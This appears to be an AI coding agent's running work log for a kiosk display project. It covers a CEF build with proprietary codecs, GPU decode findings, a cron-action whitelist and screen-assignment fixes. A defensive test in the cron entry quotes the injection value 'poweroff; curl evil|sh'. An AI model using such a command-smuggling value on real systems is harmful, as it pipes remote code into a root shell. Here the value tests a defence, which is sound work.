=== CURRENT WORK ===
(2026-08-09) Video codecs and hardware decode. CEF source build DONE, official,
codecs verified in the binary; blocked only on which Python interpreter the
wheel must be tagged for, because the kiosk image build now supports a
`RELEASE=trixie` override (`unitotem-system/kiosk/common.sh`) that leaves no
trace in tracked files, and the test VM was mid re-provision onto a fresh
trixie image when this was picked up. Do not touch `unitotem-test` until that
is confirmed settled - another agent/the coordinator owns it right now.

WHAT THE BROWSER ACTUALLY IS: CEF 147.0.10, Chromium 147.0.7727.118, V8 14.7.
Not behind at all - every piece of Chromium's Linux hardware-decode machinery
is present in the binary. So "the fork is too old" is NOT the explanation for
anything here.

WHY THERE WERE NO PROPRIETARY CODECS: the wheel is built on Spotify's prebuilt
CEF distribution, which uses Chromium's default ffmpeg_branding=Chromium.
ffmpeg is statically linked into libcef.so (no libffmpeg.so to swap), so the
only fix is building CEF from source with proprietary_codecs=true and
ffmpeg_branding=Chrome. DONE: an official (is_official_build=true, with PGO)
CEF 147 binary distribution was built from source with those flags and
verified clean (no errors in the build log, libcef.so present, resolved
args confirmed proprietary_codecs=true / ffmpeg_branding="Chrome" /
enable_platform_hevc=true / use_vaapi=true). See CLAUDE.md for the
is_official_build trap that cost one full build cycle before this one.

A cp311 wheel was built from it in the cefpy-wheel-cp311 container (recipe:
VM-TESTING.md sec. 8b) and is staged at
vendor/cefpython-wheels/cefpython3-147.0.dev0-cp311-cp311-linux_x86_64.whl
(gitignored, local only). A cp313 builder container (cefpy-wheel-trixie) is
also built and standing by, in case the re-provisioned VM turns out to run
Python 3.13. NEITHER WHEEL HAS BEEN INSTALLED OR TESTED ON A GUEST YET -
codecs are confirmed present in libcef.so by inspection, not yet confirmed
playing a real H.264 file end to end. That is the next step once the guest's
Python version is confirmed and the VM is free to touch again.

The one measurement taken with an *unofficial* build of this same source
config (before the official rebuild) showed the codec strings resolve and
the crash is unrelated to codecs - it's the allocator mismatch, see CLAUDE.md.

WHY DECODE IS IN SOFTWARE ON NVIDIA: Chromium refuses VA-API on NVIDIA on
purpose (vaapi_wrapper.cc skips nvidia-drm devices; VaapiOnNvidiaGPUs is off
by default, and forcing it on makes nvidia_drv_video.so fail to initialise
inside the GPU process anyway). Nothing to enable there. Evidence is the CDP
Media domain, not CPU: kVideoDecoderName=VpxVideoDecoder,
kIsPlatformVideoDecoder=false, and SystemInfo.getInfo's videoDecoding array
empty in every configuration tried.

CORRECTION to an earlier note in this file: `VaapiVideoDecoder` is NOT a
Chromium feature - it is only a decoder *name* string (media/base/decoder.cc).
Passing it in --enable-features= is a silent no-op. The real gates
(kAcceleratedVideoDecodeLinux, kAcceleratedVideoDecodeLinuxZeroCopyGL) are
already on by default when VA-API is compiled in. See CLAUDE.md for the full
finding, including the much bigger one: on a stock arm64 build,
use_vaapi/use_v4l2_codec both default false regardless of hardware, so the
*entire* hardware-decode client is compiled out (gpu_mojo_media_client_stubs.cc
instead of _linux.cc) - not "fails to accelerate", the code path does not
exist in the binary, and no runtime switch brings it back. Reaching V4L2 on a
Pi needs use_v4l2_codec=true in GN_DEFINES for that arm64 build specifically.

MEASURED, 1080p, whole CEF process tree, CDP Media domain for the decoder,
old codec-less wheel, both configurations:

  configuration                     VP9            H.264
  GTX 1060, proprietary 535       76.5 %         will not play
  virtio-gpu / llvmpipe           77.0 %         will not play

  H.264 fails as DEMUXER_ERROR_NO_SUPPORTED_STREAMS in both (expected - this
  is the OLD wheel). VP9 is VpxVideoDecoder (software) in both, 0 dropped
  frames in both. The GPU buys nothing for video decode - two points of
  difference is noise. NEEDS RE-MEASURING with the new wheel once installed:
  H.264 CPU cost next to VP9, on both configurations, plus confirmation the
  software path did not regress.

DONE (8438cc9): acceleration switches are now chosen from what the machine is.
utils/system/gpu.py detects the stack from the filesystem only and maps it to a
profile table that is data, not branches. Unknown hardware gets the empty
profile, so it keeps today's behaviour exactly - verified by the virtio guest
landing on it before the software profile was taught about virtio-pci. Profiles
measured: nvidia, software. Profiles reasoned from Chromium source but NOT
measured: vaapi (no Intel/AMD machine here), v4l2 (no Pi here) - VERIFIED in
gpu.py says why for each, and what evidence would promote them.

STILL OPEN:
  - Confirm the guest's Python version, install the matching wheel (cp311
    already built; cp313 container ready if needed), restart the manager, and
    verify: codec matrix via CDP again, a real H.264 file actually playing (not
    just canPlayType), no Skia segfault, CPU cost of H.264 next to VP9 on both
    virtio and the GTX 1060, and that the software path did not regress.
  - arm64/Raspberry Pi remains entirely unverified in practice, and now has a
    much sharper reason why: see the use_vaapi/use_v4l2_codec finding above.
    No arm64 wheel with codecs exists; the fork's CI-published arm64 wheels are
    Spotify-based too, so they have the same codec gap AND the same missing
    hardware-decode client unless built with explicit GN flags for arm64.
  - HEVC: enable_platform_hevc=true in the new build, but that is hardware-only
    decode on Linux - expect it to stay unplayable wherever VA-API/V4L2 is not
    engaged. AC3/EAC3/DTS stay off.
  - Licensing: enabling ffmpeg_branding=Chrome moves the H.264/AAC patent
    question onto whoever distributes the image (VM-TESTING.md sec. 8b). Needs
    a business decision, not a technical one; recorded, not resolved.

NOTE, still open, needs a decision: unitotem-system commit 76f3511 configures
hardware decode via /etc/chromium.d/50-unitotem-accel, on the premise that "the
manager drives Chromium over the DevTools protocol rather than embedding a
renderer". That is not this codebase - the manager embeds CEF in-process via
cefpython, and the kiosk image installs no chromium package at all (checked:
`which chromium` empty, dpkg count 0, no /etc/chromium.d). That file configures
a browser that is not there and has no effect on the viewer. It also asks for
--enable-features=...,VaapiVideoDecoder, which per the correction above does
nothing even where the file WOULD apply. The switches that actually matter are
the ones 8438cc9 now sets in the right place, inside the manager itself.

(2026-08-08) Screen control (SCREEN-CONTROL-PLAN.md): step 2 of 7 DONE.

Timers. Both bugs the plan identified are fixed, and the command a cron job
runs is now a looked-up named action rather than anything a request can shape.

  - UniCron.serialize() did int(str(job.minute)) on all five fields, which
    raises ValueError on any slice that is not a plain number. '*' is the
    default the web UI offers for every field, so the first realistic timer
    anyone creates - "every day at 22:00", whose last three fields are all
    '*' - blew up getJobs for the WHOLE list and made every timer on the node
    invisible. All five fields are now the raw slice string, which also means
    '*/15', '1-5' and '0,30' survive a round trip for the first time.
  - timers.vue deleteItem() only spliced the local array and never sent
    Settings/Cron/deleteJob, so a deletion looked like it worked until the
    next refresh brought the timer back. It sends the command now and lets
    the backend's reply rewrite the list.
  - utils/system/crontab.py grew an ACTIONS registry ('pwr', 'reb' -> absolute
    paths). new() and editJob() look the command up and refuse anything else;
    the duplicated '/usr/sbin/' + ('poweroff' if ... else 'reboot') in both
    crontab.py and api/system/cron.py is gone. These lines run as root and cron
    hands them to /bin/sh, so this is the difference between a whitelist and a
    command-injection hole.
  - serialize() also maps the command BACK to its action key and adds 'known'.
    It used to send the full path while the UI matched against 'pwr'/'reb', so
    the Action column had always rendered a bare '/usr/sbin/poweroff'. A job we
    did not write is now reported as-is, flagged not-known, and its schedule
    stays editable while its command is left alone.
  - The five schedule fields are comboboxes now, not selects: any cron slice is
    legal and a select would silently blank a job using one. They are validated
    with CronSlices.is_valid BEFORE the crontab is opened, because
    CronTab.__exit__ calls write() unconditionally - exception or not - so a
    slice rejected halfway through setall() would have been written back
    half-applied.
  - Removed the fake seeded "reboot at 00:00" row that looked like a real
    timer until the first backend reply, and wired the unused setJobEnabled to
    a per-row switch.
  - Option values in timers.vue are all strings now. They were numbers while
    '*' was a string, and getMonthTitle/getDayOfWeekTitle match with ===, so
    the moment the backend started sending raw slices a '1' would no longer
    have matched a 1 and the table would have shown bare numbers instead of
    month and day names.

Verified against the real root crontab on unitotem-test, end to end over the
WebSocket API: "every day at 22:00" is created and listed (the case that used
to break the list); '*/15' with '1-5' round-trips; setJobEnabled comments and
uncomments the line; deleteJob removes the right job and leaves the other; an
invalid slice and a command of "poweroff; curl evil|sh" are both refused with
the crontab left untouched. Plus 17 in-memory checks on serialize()/new().

NEXT: step 3 (manager/tests/ + pytest infrastructure).

DEFERRED from step 2, deliberately: screenctl.py and the screen power/off
actions in the registry. Their entire body is a call into utils/system/screens,
which step 4 creates - shipping them now would mean offering a timer action
that does nothing. They land with the hardware layer instead. The registry is
already the extension point.

(2026-08-07) Screen control (SCREEN-CONTROL-PLAN.md): step 1 of 7 DONE.

Assignments are now keyed on (viewer, RandR output name) instead of
(viewer, window_id), in manager/webview/controller.py. window_id is minted by
app.py's _next_id and never reused, so an output that goes away and comes back
returned under a new number and orphaned its assignment - which is exactly what
`xrandr --output X --off/--auto` will do once step 4 lands, and which already
contradicted "the playlist outputting to that window must be unaware of the
change". The output name survives the cycle.

Deliberately minimal: the playlist loops and the command channel still address
a window by window_id. Only the assignment map is re-keyed, and
_restore_assignments - which already ran on every WebviewInfo update and was
already idempotent - resolves output name -> current window_id. 486e67f's idle
push is untouched: the re-keying changes which windows land in that branch,
not the branch.

viewer_assignments.json now accepts three formats per record: the viewer-wide
dict, the window_id-keyed list, and the screen_name-keyed list it now writes.
The older two need the viewer to say which window is on which output, so they
are parked and resolved on the first WebviewInfo. A record whose window is not
present right now is KEPT pending rather than dropped (window numbering
restarts with the viewer, so an unplugged screen usually takes its number back)
and _save_assignments writes pending records back in their original format, so
an unrelated assign() from the web UI cannot erase them.

Also fixed here, because the off/on cycle turns it from rare into routine:
closing a window never detached it from its playlist loop, so the loop went on
multicasting Show to a window_id nothing answered to. _restore_assignments now
prunes windows the viewer no longer has.

Verified on unitotem-test (GTX 1060 passthrough, real 4K monitor on DP-1):
  - the VM's own real format-2 file migrated live - window 0 -> DP-1 resolved
    and rewritten, window 1 kept pending because that screen is not connected
  - manager restarted with DP-1 off reports screens=[] windows=[] and stays
    reachable; DP-1 --auto then creates the window and it comes back with its
    playlist attached, resolved from the file by output name
  - 4 consecutive off/restart/on cycles, pending record preserved every time
  - 24/24 checks in a logic harness covering all three formats, the collision
    case, and the off/on cycle under a NEW window_id

One thing chased and explained rather than left as a ghost: a pending record
appeared to vanish once. It was the collision case - the returning window took
number 1, which resolved onto DP-1, which the named record had already claimed.
The named record wins (newer, unambiguous), which is right, but it was silent
and looked exactly like an assignment going missing. It now logs a warning.

NOT verified, and it cannot be on this VM: the mid-run off/on cycle with the
window actually being destroyed and recreated. That needs two outputs, and the
last-screen blindness recorded below means a single-output node never notices
its only screen going away at all - so the window is never destroyed and the
bug cannot bite there. Covered by the logic harness only until there is a
second monitor on the passthrough GPU, or the virtio config.

NEXT: step 2 (timers - the serialize() ValueError on '*', the deleteItem() that
never calls deleteJob, and the named-action registry with uuid indirection).

(2026-08-07) Viewer idle CPU: root cause found and fixed (9977db2).

The question was whether the post-replug CPU storm is a Chromium/software-
rasterisation artefact or a UniTotem bug. It is a UniTotem bug, in our own
boot-screen.html, and it has nothing to do with re-plugging.

Control experiment (the decisive one), standalone CEF in a raw Xlib window with
no Qt and none of the manager's code, same VM, same 5120x2160 surface:

  truly static page                       0.0 % of a core
  boot-screen.html as shipped           178.6 %
  boot-screen.html, animations paused     0.5 %

So CEF is innocent. In the manager, the same window on the same screen with the
same re-plug history measures 31.9 % on the logo, 1.4 % as soon as show() puts
content in the iframe, 32.2 % back on the logo. Per animation, at 5120x2160:
both paused 1.6 %, glow (text-shadow) alone 203.8 %, rotation (ring) alone
58.7 %.

Fix: animate opacity/transform instead of paint properties, and step the frame
rate. Manager, whole process tree, before -> after:

  step                             at 4c96a0f    after 9977db2
  A  single screen 1280x800            1.6            1.0
  B  first plug   @ 5120x2160        187.8           30.5
  C  unplug                            1.5            1.2
  D  second plug  @ 5120x2160        187.6           31.0
  E  unplug                            1.3            1.2
  F  third plug   @ 1024x768          35.7            9.3
  G  unplug                            1.3            1.2

An ordinary single-screen 1280x800 node idling on the logo: 38.5 % -> 6.9 %.
Rendering unchanged (RMSE 0.8 %, 0.13 % of pixels differing by >3 %).

THEN FIXED on top of it, 486e67f: an unassigned window now shows the idle page
(unitotem-no-assets) instead of the boot screen, because such a window is idle,
not booting - a spinner meaning "loading" while nothing loads is the wrong
screen, and it was the only thing that made an idle node cost anything.
Idle cost of unassigned windows, whole process tree:

                                        before   after
  one unassigned window @1280x800        8.4 %   1.3 %
  plus one @5120x2160                   29.5 %   1.2 %

The choice between that page and the first-boot welcome screen is now
idle_asset() in utils/models/assets.py, shared with AssetsManager.current so
161e79a's precedence cannot drift. The push lives in
WebviewManager._restore_assignments, the only place that sees per window
whether a playlist is attached. boot-screen.html is untouched and is still what
a window loads at startup - verified off the framebuffer that the logo still
appears while the manager comes up.

Also fixed along the way (1f3a485): the glow copy added by 9977db2 was still
generating its own spinner ring, because `.halo::before` ties on specificity
with `.loader::before` and lost on source order - a third animation nobody
could see. Ask document.getAnimations() rather than reading the CSS.

STILL OPEN:
  - The boot screen itself, while it is legitimately up during startup, still
    costs ~27 % of a core at 5120x2160 and ~7 % at 1280x800. That residual is
    software compositing and cannot be removed in CSS: with no GPU every
    animated frame re-composites the whole surface. A single
    compositor-animated ring and nothing else still costs 51.9 % at 60fps and
    18.1 % at 20fps at 5120x2160. Levers left: fewer frames, or a GPU.
  - PRE-EXISTING BUG, found while testing 486e67f, not fixed here because it is
    not in manager/webview/: on a genuine first boot the welcome screen never
    gets shown. PlaylistsManager.load() takes its "no playlists.json" branch,
    creates an empty default playlist and calls _save_index(), which sets
    environ._unitotem_first_boot = False - at startup, before any viewer has
    connected. So the flag 161e79a wired up is already clear by the time
    anything asks idle_asset()/AssetsManager.current, and a fresh node shows
    the plain no-assets page instead of the hotspot credentials that are the
    only way into it. Reproduced on the VM: delete playlists.json, restart, the
    screen shows unitotem-no-assets. The flag itself works
    (idle_asset() returns unitotem-first-boot when it is set) - it is
    _save_index() clearing it during bootstrap that is wrong.
  - Not investigated here, and owned by SCREEN-CONTROL-PLAN.md step 1: keying
    assignments on the RandR output name instead of the incrementing window_id,
    so a re-plugged monitor resumes its playlist instead of coming back
    unassigned. 486e67f deliberately does not touch the keying question.
    DONE - see the step 1 entry at the top of this file.

